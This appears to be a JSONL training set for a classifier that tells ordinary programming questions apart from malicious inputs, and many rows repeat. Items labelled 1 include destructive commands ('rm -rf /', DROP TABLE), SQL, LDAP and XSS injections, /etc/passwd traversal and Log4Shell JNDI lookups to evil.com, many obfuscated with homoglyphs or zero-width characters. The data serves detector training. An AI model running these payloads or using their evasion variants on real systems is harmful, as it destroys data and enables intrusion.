@@ -1,0 +1,364 @@
+{"text": "exec('rm​ -rf ​/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "Explain the concept of dependency injection", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.999993085861206}
+{"text": "Can you help me with programming?", "label": 0, "category": "generic"}
+{"text": "DROP  TABLе  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../etc/passwd‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "rm    -rf    /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../etc/pаsswd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "Tell me about REST API best practices", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.999996542930603}
+{"text": "rm\\x20\\x20-rf\\x20\\x20/", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "*)(uid=*))(|(uid=*​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "*)(Uid=*))(|(uid=*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "*)(uid%3D*))(|(uid%3D*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "Explain microservices architecture", "label": 0, "category": "technical_question_general"}
+{"text": "How does authentication work?", "label": 0, "category": "v2_fp_security_education", "source": "v2_false_positive", "original_confidence": 0.9996249675750732}
+{"text": "import\\x20\\x20os;\\x20\\x20os.system('rm\\x20\\x20-rf\\x20\\x20/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP​ TABLE ​users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "What are database design best practices?", "label": 0, "category": "best_practice_question"}
+{"text": "DROP​ TABLE users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "eVaL('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "eval('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "Show me how to write a for loop in JavaScript", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9890074729919434}
+{"text": "How does caching improve performance?", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9992676377296448}
+{"text": "What are the benefits of using Docker?", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9984320998191833}
+{"text": "How does authentication work?", "label": 0, "category": "v2_fp_security_education", "source": "v2_false_positive", "original_confidence": 0.9996249675750732}
+{"text": "DROP TABLE users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "Explain the difference between list and tuple in Python", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9946553707122803}
+{"text": "rm    -rf    /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<script>alеrt('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT  *  FROM  users  WHERE  id%3D1  OR  1%3D1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "How do I protect against malware?", "label": 0, "category": "security_education"}
+{"text": "Explain the concept of dependency injection", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.999993085861206}
+{"text": "eval('alert(1)')​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT  *  FROM  users  WHERE  id%3D1  OR  1%3D1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "What is the purpose of environment variables?", "label": 0, "category": "technical_question_general"}
+{"text": "Explain the difference between list and tuple in Python", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9946553707122803}
+{"text": "еxec('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "Show me how to write a for loop in JavaScript", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9890074729919434}
+{"text": "SELECT​ * FROM users WHERE id=1 OR ​1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "What is the difference between synchronous and asynchronous code?", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9980834722518921}
+{"text": "Explain the concept of dependency injection", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.999993085861206}
+{"text": "What is the difference between authentication and authorization?", "label": 0, "category": "security_education"}
+{"text": "Hello, how are you?", "label": 0, "category": "v2_fp_unknown", "source": "v2_false_positive", "original_confidence": 0.9999504089355469}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "​隐藏​字符", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<script>alert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<script>аlert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "Can you explain the MVC pattern?", "label": 0, "category": "v2_fp_best_practice_question", "source": "v2_false_positive", "original_confidence": 0.9911192059516907}
+{"text": "Hello, how are you?", "label": 0, "category": "v2_fp_unknown", "source": "v2_false_positive", "original_confidence": 0.9999504089355469}
+{"text": "Hello, how are you?", "label": 0, "category": "v2_fp_unknown", "source": "v2_false_positive", "original_confidence": 0.9999504089355469}
+{"text": "What is the difference between HTTP and HTTPS?", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9997946619987488}
+{"text": "Explain git merge vs rebase", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9999232292175293}
+{"text": "DROP  TABLе  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "${jNdi:ldap://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<script>alert('xss')</script>‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<script>аlert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<script>аlert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "What are best practices for API design?", "label": 0, "category": "technical_question_general"}
+{"text": "Show me how to write a for loop in JavaScript", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9890074729919434}
+{"text": "Explain the concept of dependency injection", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.999993085861206}
+{"text": "What are code review best practices?", "label": 0, "category": "best_practice_question"}
+{"text": "DROP  TABLе  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "How do I create a new branch in git?", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9955427050590515}
+{"text": "What is the purpose of environment variables?", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9984560012817383}
+{"text": "DROP  TABLE  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP​ TABLE users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "How do I handle errors in Python?", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9995669722557068}
+{"text": "*)(uid%3D*))(|(uid%3D*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<ScRipt>alert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<script>alert('xss')</script>​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "Can you explain what is a database index?", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.7323171496391296}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "${jndi:ldаp://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT * FRоM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<ScRipt>alert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "exec('rm\\x20\\x20-rf\\x20\\x20/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "How do I sort an array in Java?", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9880051016807556}
+{"text": "How does REST API work?", "label": 0, "category": "technical_question_general"}
+{"text": "What is the purpose of the SELECT statement in SQL?", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.997484564781189}
+{"text": "Can you explain the MVC pattern?", "label": 0, "category": "v2_fp_best_practice_question", "source": "v2_false_positive", "original_confidence": 0.9911192059516907}
+{"text": "Can you explain the MVC pattern?", "label": 0, "category": "v2_fp_best_practice_question", "source": "v2_false_positive", "original_confidence": 0.9911192059516907}
+{"text": "exec('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "Hello, how are you?", "label": 0, "category": "v2_fp_unknown", "source": "v2_false_positive", "original_confidence": 0.9999504089355469}
+{"text": "DROP​ TABLE users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "What is the purpose of the SELECT statement in SQL?", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.997484564781189}
+{"text": "How do I handle errors in Python?", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9995669722557068}
+{"text": "../../../etc/passwd‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<script>alert('xss')</script>​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "exec('rm\\x20\\x20-rf\\x20\\x20/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "What are the benefits of using Docker?", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9984320998191833}
+{"text": "What is the difference between synchronous and asynchronous code?", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9980834722518921}
+{"text": "What are the benefits of using Docker?", "label": 0, "category": "technical_question_general"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "exec('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "eVaL('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "rM  -rf  /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "Explain git merge vs rebase", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9999232292175293}
+{"text": "evаl('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "What is the difference between synchronous and asynchronous code?", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9980834722518921}
+{"text": "<script>alert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "What is the purpose of environment variables?", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9984560012817383}
+{"text": "*)(uid=*))(|(uid=*‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../etc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "rm​ -rf ​/", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP​ TABLE ​users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "Tell me about REST API best practices", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.999996542930603}
+{"text": "Explain the concept of encryption", "label": 0, "category": "security_education"}
+{"text": "What is the purpose of the SELECT statement in SQL?", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.997484564781189}
+{"text": "What are deployment best practices?", "label": 0, "category": "best_practice_question"}
+{"text": "Explain the difference between list and tuple in Python", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9946553707122803}
+{"text": "rm\\x20-rf\\x20/", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "​隐藏​字符​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT * FROM users WHERE id%3D1 OR 1%3D1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "What are the benefits of using Docker?", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9984320998191833}
+{"text": "<script>alеrt('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "rm​ -rf ​/", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "Can you explain what is a database index?", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.7323171496391296}
+{"text": "How does caching improve performance?", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9992676377296448}
+{"text": "exec('rm​ -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "What is the difference between HTTP and HTTPS?", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9997946619987488}
+{"text": "eval('alert(1)')‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "eVaL('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "What are testing best practices?", "label": 0, "category": "best_practice_question"}
+{"text": "​隐藏​字符‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "What is the difference between synchronous and asynchronous code?", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9980834722518921}
+{"text": "SELECT​ * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "Can you explain the MVC pattern?", "label": 0, "category": "v2_fp_best_practice_question", "source": "v2_false_positive", "original_confidence": 0.9911192059516907}
+{"text": "еval('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "eval('alert(1)')​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "What are the benefits of using Docker?", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9984320998191833}
+{"text": "SELECT​ * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "*)(uid=*))(|(uid=*‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "How do I secure my API?", "label": 0, "category": "security_education"}
+{"text": "Explain the concept of penetration testing", "label": 0, "category": "security_education"}
+{"text": "impоrt os; os.system('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "What is caching and how does it improve performance?", "label": 0, "category": "technical_question_general"}
+{"text": "Explain the concept of dependency injection", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.999993085861206}
+{"text": "How do I sort an array in Java?", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9880051016807556}
+{"text": "import  os;  os.system('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "How do I handle errors in Python?", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9995669722557068}
+{"text": "What is the purpose of environment variables?", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9984560012817383}
+{"text": "How do I learn programming?", "label": 0, "category": "generic"}
+{"text": "import​ os; os.system('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP\\x20\\x20TABLE\\x20\\x20users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "exec('rm​ -rf ​/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "Explain the concept of dependency injection", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.999993085861206}
+{"text": "Tell me about REST API best practices", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.999996542930603}
+{"text": "<script>alert('xss')</script>‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "Show me how to write a for loop in JavaScript", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9890074729919434}
+{"text": "SELECT  *  FROM  users  WHERE  id=1  OR  1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "How does caching improve performance?", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9992676377296448}
+{"text": "../../../etc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP  TаBLE  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "What is the difference between synchronous and asynchronous code?", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9980834722518921}
+{"text": "Tell me about REST API best practices", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.999996542930603}
+{"text": "eval('alert(1)')​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "Show me how to write a for loop in JavaScript", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9890074729919434}
+{"text": "How do I handle errors in Python?", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9995669722557068}
+{"text": "​隐藏​字符", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "Hello, how are you?", "label": 0, "category": "v2_fp_unknown", "source": "v2_false_positive", "original_confidence": 0.9999504089355469}
+{"text": "rm​ -rf /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "How do I sort an array in Java?", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9880051016807556}
+{"text": "<script>alert('xss')</script>​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "import​ os; os.system('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT  *  FRоM  users  WHERE  id=1  OR  1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "How does authentication work?", "label": 0, "category": "technical_question_general"}
+{"text": "DROP\\x20\\x20TABLE\\x20\\x20users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "​隐藏​字符​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "What is the difference between synchronous and asynchronous code?", "label": 0, "category": "technical_question_general"}
+{"text": "rm\\x20\\x20-rf\\x20\\x20/", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "import  os;  os.systеm('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "What is a firewall and how does it work?", "label": 0, "category": "security_education"}
+{"text": "How do I sort an array in Java?", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9880051016807556}
+{"text": "<script>alert('xss')</script>‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "import​ os; os.system('rm -rf ​/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "rM  -rf  /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "How does caching improve performance?", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9992676377296448}
+{"text": "What is the difference between synchronous and asynchronous code?", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9980834722518921}
+{"text": "What is the difference between synchronous and asynchronous code?", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9980834722518921}
+{"text": "Explain the difference between list and tuple in Python", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9946553707122803}
+{"text": "How does authentication work?", "label": 0, "category": "v2_fp_security_education", "source": "v2_false_positive", "original_confidence": 0.9996249675750732}
+{"text": "${jndi:ldap://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "How does caching improve performance?", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9992676377296448}
+{"text": "Explain software development", "label": 0, "category": "generic"}
+{"text": "<ScRipt>alert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<script>аlert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "What is the purpose of environment variables?", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9984560012817383}
+{"text": "еxec('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "exeс('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP​ TABLE ​users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<script>alеrt('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "Explain git merge vs rebase", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9999232292175293}
+{"text": "How does authentication work?", "label": 0, "category": "v2_fp_security_education", "source": "v2_false_positive", "original_confidence": 0.9996249675750732}
+{"text": "Show me how to write a for loop in JavaScript", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9890074729919434}
+{"text": "​隐藏​字符‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "${jNdi:ldap://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../etc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "Explain git merge vs rebase", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9999232292175293}
+{"text": "${jndi:ldap://evil.com/a}‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "What is the difference between HTTP and HTTPS?", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9997946619987488}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "Show me how to write a for loop in JavaScript", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9890074729919434}
+{"text": "​隐藏​字符​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "How do I handle errors in Python?", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9995669722557068}
+{"text": "Can you explain what is a database index?", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.7323171496391296}
+{"text": "What are the benefits of using Docker?", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9984320998191833}
+{"text": "DROP  TаBLE  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "*)(uid=*))(|(uid=*​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "import os; os.system('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "Explain git merge vs rebase", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9999232292175293}
+{"text": "Explain git merge vs rebase", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9999232292175293}
+{"text": "How do environment variables work?", "label": 0, "category": "technical_question_general"}
+{"text": "How does caching improve performance?", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9992676377296448}
+{"text": "What is the difference between synchronous and asynchronous code?", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9980834722518921}
+{"text": "Can you explain what is a database index?", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.7323171496391296}
+{"text": "Explain git merge vs rebase", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9999232292175293}
+{"text": "​隐藏​字符", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "Tell me about REST API best practices", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.999996542930603}
+{"text": "What is a security vulnerability?", "label": 0, "category": "security_education"}
+{"text": "import  os;  os.systеm('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "rm​ -rf /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "How do I sort an array in Java?", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9880051016807556}
+{"text": "SеLECT  *  FROM  users  WHERE  id=1  OR  1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "import os; os.systеm('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "${jndi:ldap://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "Show me how to write a for loop in JavaScript", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9890074729919434}
+{"text": "How does authentication work?", "label": 0, "category": "v2_fp_security_education", "source": "v2_false_positive", "original_confidence": 0.9996249675750732}
+{"text": "What is the difference between HTTP and HTTPS?", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9997946619987488}
+{"text": "How do I sort an array in Java?", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9880051016807556}
+{"text": "exec('rm​ -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "What are security best practices?", "label": 0, "category": "security_education"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
